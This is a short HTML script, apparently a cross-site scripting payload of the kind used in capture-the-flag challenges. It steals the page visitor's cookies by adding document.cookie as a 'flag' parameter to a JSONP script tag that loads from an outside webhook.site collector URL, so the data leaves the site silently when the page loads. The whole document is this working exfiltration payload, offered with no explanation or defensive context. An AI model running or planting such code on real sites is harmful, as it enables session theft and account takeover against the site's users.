<script>
    const jsonp = (opts = {}) => {
        opts.url = `${opts.url}?callback=${opts.callback}`;

        opts.url += `&flag=${document.cookie}`;

        const script = document.createElement('script');
        script.src = opts.url;

        script.onload = () => {
            document.body.removeChild(script);
        }

        document.body.appendChild(script);
    };


    jsonp({
        url: 'https://webhook.site/e3ab22b6-1f71-4947-b427-635458e273a9/',
        callback: 'getData'
    });

    function getData(data) {
        console.log(data);
    }
</script>
